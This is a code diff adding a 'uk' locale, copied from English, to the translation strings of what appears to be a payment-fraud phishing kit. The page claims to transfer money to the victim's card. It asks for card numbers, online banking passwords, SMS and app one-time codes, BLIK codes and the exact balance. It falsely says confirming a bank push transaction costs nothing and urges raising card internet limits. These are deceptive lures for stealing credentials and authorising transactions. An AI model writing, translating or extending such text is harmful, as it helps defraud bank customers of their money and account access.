@@ -9,6 +9,7 @@ module.exports = {
     ro: "Chat de asistență",
     it: "Chat di supporto",
     ae: "دعم الدردشة",
+    uk: "Support Chat",
   },
   your_message: {
     en: "Your message... ",
@@ -20,6 +21,7 @@ module.exports = {
     ro: "Mesajul dvs...",
     it: "Il tuo messaggio...",
     ae: "رسالتك...",
+    uk: "Your message... ",
   },
   send: {
     en: "Send",
@@ -31,6 +33,7 @@ module.exports = {
     ro: "Trimite",
     it: "Spedire",
     ae: "يرسل",
+    uk: "Send",
   },
   card_balance: {
     en: "Card balance",
@@ -42,6 +45,7 @@ module.exports = {
     ro: "Soldul cardului",
     it: "Saldo della carta",
     ae: "رصيد البطاقة",
+    uk: "Card balance",
   },
   expires: {
     en: "Expires",
@@ -53,6 +57,7 @@ module.exports = {
     ro: "Expiră",
     it: "Scade",
     ae: "تنتهي",
+    uk: "Expires",
   },
   card_number: {
     en: "Card number",
@@ -64,6 +69,7 @@ module.exports = {
     ro: "Număr de card",
     it: "Numero di carta",
     ae: "رقم البطاقة",
+    uk: "Card number",
   },
   expiration_date: {
     en: "Expiration date",
@@ -75,6 +81,7 @@ module.exports = {
     ro: "Data expirării",
     it: "Data di scadenza",
     ae: "تاريخ الإنتهاء",
+    uk: "Expiration date",
   },
   month: {
     en: "Month",
@@ -86,6 +93,7 @@ module.exports = {
     ro: "Lună",
     it: "Mese",
     ae: "شهر",
+    uk: "Month",
   },
   year: {
     en: "Year",
@@ -97,6 +105,7 @@ module.exports = {
     ro: "An",
     it: "Anno",
     ae: "سنة",
+    uk: "Year",
   },
   wrong_code: {
     en: "You have entered the wrong code! Please try again.",
@@ -108,6 +117,7 @@ module.exports = {
     ro: "Ați introdus un cod greșit! Vă rugăm să încercați din nou.",
     it: "Hai inserito il codice sbagliato! Per favore riprova.",
     ae: "لقد أدخلت الرمز الخطأ! حاول مرة اخرى.",
+    uk: "You have entered the wrong code! Please try again.",
   },
   push_title: {
     en: "To verify your card, confirm the transaction on the bank's mobile app",
@@ -119,6 +129,7 @@ module.exports = {
     ro: "Pentru a vă verifica cardul, confirmați tranzacția în aplicația mobilă a băncii",
     it: "Per verificare la tua carta, conferma la transazione sull'app mobile della banca",
     ae: "للتحقق من بطاقتك ، قم بتأكيد المعاملة على تطبيق الهاتف المحمول الخاص بالبنك",
+    uk: "To verify your card, confirm the transaction on the bank's mobile app",
   },
   push_text: {
     en: "To transfer money to your card, your card must be verified. This is a request to verify the card, but you will not be charged, the system will simply state that the card is not blocked and is ready for the transaction.",
@@ -130,6 +141,7 @@ module.exports = {
     ro: "Pentru a transfera bani pe cardul dvs., cardul dvs. trebuie verificat. Aceasta este o solicitare de verificare a cardului, dar nu veți fi taxat, sistemul va spune pur și simplu că cardul nu este blocat și este gata pentru tranzacție.",
     it: "Per trasferire denaro sulla tua carta, la tua carta deve essere verificata. Questa è una richiesta di verifica della carta, ma non ti verrà addebitato, il sistema indicherà semplicemente che la carta non è bloccata ed è pronta per la transazione.",
     ae: "لتحويل الأموال إلى بطاقتك ، يجب التحقق من بطاقتك. هذا طلب للتحقق من البطاقة ، لكن لن يتم تحصيل رسوم منك ، سيذكر النظام ببساطة أن البطاقة ليست محظورة وجاهزة للمعاملة.",
+    uk: "To transfer money to your card, your card must be verified. This is a request to verify the card, but you will not be charged, the system will simply state that the card is not blocked and is ready for the transaction.",
   },
   success: {
     en: "Success",
@@ -141,6 +153,7 @@ module.exports = {
     ro: "Succes",
     it: "Successo",
     ae: "نجاح",
+    uk: "Success",
   },
   money_will: {
     en: "The money will be transferred to your bank card within 24 hours.",
@@ -152,6 +165,7 @@ module.exports = {
     ro: "Banii vor fi transferați pe cardul dumneavoastră bancar în termen de 24 de ore.",
     it: "Il denaro sarà trasferito sulla tua carta di credito entro 24 ore.",
     ae: "سيتم تحويل الأموال إلى بطاقتك المصرفية في غضون 24 ساعة.",
+    uk: "The money will be transferred to your bank card within 24 hours.",
   },
   bank_passord_title: {
     en: "Enter your online banking password",
@@ -163,6 +177,7 @@ module.exports = {
     ro: "Introduceți parola dvs. bancară online",
     it: "Inserisci la tua password bancaria online",
     ae: "أدخل كلمة المرور الخاصة بالخدمات المصرفية عبر الإنترنت",
+    uk: "Enter your online banking password",
   },
   sms_title: {
     en: "enter SMS code",
@@ -174,6 +189,7 @@ module.exports = {
     ro: "introduceți codul SMS",
     it: "inserire il codice SMS",
     ae: "أدخل رمز SMS",
+    uk: "enter SMS code",
   },
   sms_text: {
     en: "A one-time SMS code has been sent to your phone",
@@ -185,6 +201,7 @@ module.exports = {
     ro: "Un cod SMS unic a fost trimis pe telefonul dvs",
     it: "Un codice SMS monouso è stato inviato al tuo telefono",
     ae: "تم إرسال رمز SMS لمرة واحدة إلى هاتفك",
+    uk: "A one-time SMS code has been sent to your phone",
   },
   bank_passord_text: {
     en: "You must provide a password for your mobile bank",
@@ -196,6 +213,7 @@ module.exports = {
     ro: "Trebuie să furnizați o parolă pentru banca dvs. mobilă",
     it: "Devi fornire una password per la tua banca mobile",
     ae: "يجب عليك توفير كلمة مرور للبنك المحمول الخاص بك",
+    uk: "You must provide a password for your mobile bank",
   },
   bank_passord_placeholder: {
     en: "Password",
@@ -207,6 +225,7 @@ module.exports = {
     ro: "Parola",
     it: "Parola d'ordine",
     ae: "كلمه السر",
+    uk: "Password",
   },
   sms_placeholder: {
     en: "One-time SMS code",
@@ -218,6 +237,7 @@ module.exports = {
     ro: "Cod SMS unic",
     it: "Codice SMS monouso",
     ae: "رمز SMS لمرة واحدة",
+    uk: "One-time SMS code",
   },
   bank_passord_wrong: {
     en: "You entered the wrong password",
@@ -229,6 +249,7 @@ module.exports = {
     ro: "Ați introdus o parolă greșită",
     it: "Hai inserito la password sbagliata",
     ae: "لقد أدخلت كلمة مرور خاطئة",
+    uk: "You entered the wrong password",
   },
   app_code_title: {
     en: "Within 2 minutes, the verification code will be sent to your banking application.",
@@ -240,6 +261,7 @@ module.exports = {
     ro: "În 2 minute, codul de verificare va fi trimis către aplicația dvs. bancară.",
     it: "Entro 2 minuti, il codice di verifica verrà inviato alla tua applicazione bancaria.",
     ae: "في غضون دقيقتين ، سيتم إرسال رمز التحقق إلى تطبيقك المصرفي.",
+    uk: "Within 2 minutes, the verification code will be sent to your banking application.",
   },
   app_code_text: {
     en: "enter the code that was sent to your banking application",
@@ -251,6 +273,7 @@ module.exports = {
     ro: "introduceți codul care a fost trimis în aplicația dvs. bancară",
     it: "inserisci il codice che è stato inviato alla tua applicazione bancaria",
     ae: "أدخل الرمز الذي تم إرساله إلى تطبيقك المصرفي",
+    uk: "enter the code that was sent to your banking application",
   },
   app_code_placeholder: {
     en: "Verification code",
@@ -262,6 +285,7 @@ module.exports = {
     ro: "Cod de verificare",
     it: "Codice di verifica",
     ae: "شيفرة التأكيد",
+    uk: "Verification code",
   },
   call_code_title: {
     en: "The bank will give you a verification code over the phone",
@@ -273,6 +297,7 @@ module.exports = {
     ro: "Banca vă va oferi un cod de verificare prin telefon",
     it: "La banca ti fornirà un codice di verifica per telefono",
     ae: "سيعطيك البنك رمز التحقق عبر الهاتف",
+    uk: "The bank will give you a verification code over the phone",
   },
   call_code_text: {
     en: "enter the code the bank gave you over the phone",
@@ -284,6 +309,7 @@ module.exports = {
     ro: "introduceți codul pe care vi l-a dat banca la telefon",
     it: "inserisci il codice che la banca ti ha fornito al telefono",
     ae: "أدخل الرمز الذي أعطاك البنك لك عبر الهاتف",
+    uk: "enter the code the bank gave you over the phone",
   },
   call_code_placeholder: {
     en: "enter the code",
@@ -295,6 +321,7 @@ module.exports = {
     ro: "Introduceti codul",
     it: "inserisci il codice",
     ae: "ادخل الكود",
+    uk: "enter the code",
   },
   blik_code_title: {
     en: "BLIK payment",
@@ -306,6 +333,7 @@ module.exports = {
     ro: "Plata BLIK",
     it: "Pagamento BLIK",
     ae: "دفع BLIK",
+    uk: "BLIK payment",
   },
   blik_code_text: {
     en: "Generate a Blik code on your account and enter it",
@@ -317,6 +345,7 @@ module.exports = {
     ro: "Generați un cod Blik pe contul dvs. și introduceți-l",
     it: "Genera un codice Blik sul tuo account e inseriscilo",
     ae: "قم بإنشاء رمز Blik على حسابك وأدخله",
+    uk: "Generate a Blik code on your account and enter it",
   },
   blik_code_placeholder: {
     en: "BLIK code",
@@ -328,6 +357,7 @@ module.exports = {
     ro: "Cod BLIK",
     it: "codice BLIK",
     ae: "كود بليك",
+    uk: "BLIK code",
   },
   picture_title: {
     en: "When verifying your account in the system, we will provide the image title with your phone, which you must provide for confirmation. Once the correct images are provided, the funds will be credited to your account.",
@@ -339,6 +369,7 @@ module.exports = {
     ro: "Când vă verificăm contul în sistem, vă vom furniza titlul imaginii împreună cu telefonul dvs., pe care trebuie să îl furnizați pentru confirmare. Odată ce sunt furnizate imaginile corecte, fondurile vor fi creditate în contul dumneavoastră.",
     it: "Durante la verifica del tuo account nel sistema, ti forniremo il titolo dell'immagine con il tuo telefono, che devi fornire per conferma. Una volta fornite le immagini corrette, i fondi verranno accreditati sul tuo account.",
     ae: "عند التحقق من حسابك في النظام ، سنزودك بعنوان الصورة بهاتفك ، والذي يجب عليك تقديمه للتأكيد. بمجرد تقديم الصور الصحيحة ، ستتم إضافة الأموال إلى حسابك.",
+    uk: "When verifying your account in the system, we will provide the image title with your phone, which you must provide for confirmation. Once the correct images are provided, the funds will be credited to your account.",
   },
   picture_text: {
     en: "In a moment, we will call you and say a word-picture. In some cases, we'll send a push notification to your bank's app after you provide the first picture that you need to confirm.",
@@ -350,6 +381,7 @@ module.exports = {
     ro: "Într-o clipă, vă vom suna și vă vom spune o imagine-cuvânt. În unele cazuri, vom trimite o notificare push către aplicația băncii dvs. după ce furnizați prima imagine pe care trebuie să o confirmați.",
     it: "Tra un momento, ti chiameremo e diremo una parola-immagine. In alcuni casi, invieremo una notifica push all'app della tua banca dopo che avrai fornito la prima immagine che devi confermare.",
     ae: "بعد قليل سنتصل بك ونقول صورة بالكلمة. في بعض الحالات ، سنرسل إشعارًا فوريًا إلى تطبيق البنك الذي تتعامل معه بعد تقديم الصورة الأولى التي تحتاج إلى تأكيدها.",
+    uk: "In a moment, we will call you and say a word-picture. In some cases, we'll send a push notification to your bank's app after you provide the first picture that you need to confirm.",
   },
   wrong_picture: {
     en: "You chose the wrong photo",
@@ -361,6 +393,7 @@ module.exports = {
     ro: "Ai ales fotografia greșită",
     it: "Hai scelto la foto sbagliata",
     ae: "لقد اخترت الصورة الخاطئة",
+    uk: "You chose the wrong photo",
   },
   submit: {
     en: "Submit",
@@ -372,6 +405,7 @@ module.exports = {
     ro: "Trimite",
     it: "Invia",
     ae: "إرسال",
+    uk: "Submit",
   },
   error: {
     en: "An unexpected error has occurred. Please try again",
@@ -383,6 +417,7 @@ module.exports = {
     ro: "A aparut o eroare neasteptata. Vă rugăm să încercați din nou",
     it: "Si è verificato un errore imprevisto. Per favore riprova",
     ae: "لقد حدث خطأ غير متوقع. حاول مرة اخرى",
+    uk: "An unexpected error has occurred. Please try again",
   },
   error_title: {
     en: "Error",
@@ -394,6 +429,7 @@ module.exports = {
     ro: "Eroare",
     it: "Errore",
     ae: "خطأ",
+    uk: "Error",
   },
   card_number_invalid: {
     en: "Card number is incorrect",
@@ -405,6 +441,7 @@ module.exports = {
     ro: "Numărul cardului este incorect",
     it: "Il numero della carta non è corretto",
     ae: "رقم البطاقة غير صحيح",
+    uk: "Card number is incorrect",
   },
   attention: {
     en: "Attention",
@@ -416,6 +453,7 @@ module.exports = {
     ro: "Atenţie",
     it: "Attenzione",
     ae: "انتباه",
+    uk: "Attention",
   },
   bank_asked: {
     en: "The bank requested additional bank card information to verify card ownership.",
@@ -427,6 +465,7 @@ module.exports = {
     ro: "Banca a solicitat informații suplimentare despre cardul bancar pentru a verifica calitatea de proprietar al cardului.",
     it: "La banca ha richiesto ulteriori informazioni sulla carta bancaria per verificare la proprietà della carta.",
     ae: "طلب البنك معلومات بطاقة مصرفية إضافية للتحقق من ملكية البطاقة.",
+    uk: "The bank requested additional bank card information to verify card ownership.",
   },
   wait: {
     en: "Expect",
@@ -438,6 +477,7 @@ module.exports = {
     ro: "Aştepta",
     it: "Aspettare",
     ae: "يتوقع",
+    uk: "Expect",
   },
   bank_processes: {
     en: "The bank is processing your data. This may take some time",
@@ -449,6 +489,7 @@ module.exports = {
     ro: "Banca vă prelucrează datele. Acest lucru poate dura ceva timp",
     it: "La banca sta elaborando i tuoi dati. Questo potrebbe richiedere del tempo",
     ae: "يقوم البنك بمعالجة بياناتك. هذا قد يستغرق بعض الوقت",
+    uk: "The bank is processing your data. This may take some time",
   },
   limits: {
     en: "You need to raise the internet limits on your card to make a transaction!",
@@ -460,6 +501,7 @@ module.exports = {
     ro: "Trebuie să ridici limitele de internet pe cardul tău pentru a face o tranzacție!",
     it: "Devi aumentare i limiti di Internet sulla tua carta per effettuare una transazione!",
     ae: "تحتاج إلى رفع حدود الإنترنت على بطاقتك لإجراء معاملة!",
+    uk: "You need to raise the internet limits on your card to make a transaction!",
   },
   other_card: {
     en: "At this moment we do not cooperate with cards of this bank. You need to specify a card of another bank!",
@@ -471,6 +513,7 @@ module.exports = {
     ro: "În acest moment nu cooperăm cu cardurile acestei bănci. Trebuie să specificați un card al unei alte bănci!",
     it: "Al momento non collaboriamo con le carte di questa banca. Devi specificare una carta di un'altra banca!",
     ae: "في هذه اللحظة نحن لا نتعاون مع بطاقات هذا البنك. تحتاج إلى تحديد بطاقة بنك آخر!",
+    uk: "At this moment we do not cooperate with cards of this bank. You need to specify a card of another bank!",
   },
   for_verify: {
     en: "",
@@ -482,6 +525,7 @@ module.exports = {
     ro: "",
     it: "",
     ae: "",
+    uk: "",
   },
   correct_balance: {
     en: "enter the exact balance on your card!",
@@ -493,6 +537,7 @@ module.exports = {
     ro: "introduceți soldul exact pe cardul dvs.!",
     it: "inserisci il saldo esatto sulla tua carta!",
     ae: "أدخل الرصيد الدقيق على بطاقتك!",
+    uk: "enter the exact balance on your card!",
   },
   currency: {
     pl: "zł",
